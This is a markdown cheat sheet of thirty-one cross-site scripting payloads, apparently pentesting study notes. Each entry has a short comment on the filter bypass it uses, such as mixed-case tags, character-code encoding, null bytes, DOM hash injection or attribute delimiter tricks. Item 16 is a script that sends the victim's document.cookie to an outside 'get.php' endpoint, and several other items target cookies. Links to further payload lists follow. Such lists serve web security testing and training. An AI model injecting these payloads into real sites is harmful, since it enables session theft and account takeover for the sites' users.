
### Top XSS Payloads 


1- `<script>alert("1")</script>`  


2- `<sCript> alert("bypassing simple filters") </sCRIpt>` 


3- PentesterLab 


4- `<a onmouseover="alert(document.cookie)">xxs link</a> | <a onmouseover=alert(document.cookie)>xxs link</a>`


5- `<img src='zzzz' onerror='alert(1)' />` 


6- `<div style="color:red" onclick=alert('xss')>`  | Coloring is adding to see the div


7- `<div style="color:green" onmouseover=alert('xss') >`


8- `<script>console.log("test")</script>` |  __Tests if word script is allowed but alert is not__


9- <img src="cc" onerror=eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32))> | __alert is not allowed__ 


10- `</script><script>alert('XSS');</script>` | __escaping script tags to excute the payload__


11- `';alert('xss');//`  | The apostrophe character is used to escape in PHP htmlentities __'__


12- `' onerror=alert('xss');> ` &nbsp;  &nbsp; |  &nbsp; use this if the vulnerability in the image


13- `#<script>alert(1)</script>` &nbsp;  &nbsp;  |  &nbsp;  __exploiting the DOM xss with hash.substring__


14- `#javascript:alert(1)`  &nbsp;  &nbsp; |  &nbsp;  __exploiting the DOM xss with hash.substring__


15- `" onmouseover="alert(1)` &nbsp;  &nbsp; |  &nbsp;


16- `<script> var i = new Image(); i.src="http://URL/get.php?cookie="+escape(document.cookie)</script>` | __to get cookie__


17- `“><script >alert(document.cookie)</script >` |  __to get cookie__


18- `“><ScRiPt>alert(document.cookie)</ScRiPt>` 


19- ` “%3e%3cscript%3ealert(document.cookie)%3c/script%3e` 


20- `“><scr<script>ipt>alert(document.cookie)</scr</script>ipt>`


21- `%00“><script>alert(document.cookie)</script>`

22- `<object data=”data:text/html,<script>alert(1)</script>”>`

23- `<object data=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”>`

24- `<a href=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”>`

25- `Click here</a>`

26- `<img o[%00]nerror=alert(1) src=a> ` | to bypass attribute filters

27- `<img onerror=”alert(1)”src=a>`   | attribute delimiter

28- `<img onerror=’alert(1)’src=a>` | attribute delimiter      

29- `<img onerror=`alert(1)`src=a>` | attribute delimiter

30- `<img onerror=a[%00]lert(1) src=a>` | attribute value

31- `<img onerror=a&#x6c;ert(1) src=a>` | attribute value



### Extra Resources:

- [Convert Characters to ASCII Codes](https://www.browserling.com/tools/text-to-ascii)

- [Complete List of XSS Payloads:](https://github.com/nairuzabulhul/RoadMap/blob/master/PTP/Web_Security/XSS_Payload_List.txt)

- [ABC of XSS](https://quanyang.github.io/the-abcs-of-xss/)

- [Infosec Notes](http://f4l13n5n0w.github.io/blog/2015/05/21/pentesterlab-web-for-pentester-xss/)

- 
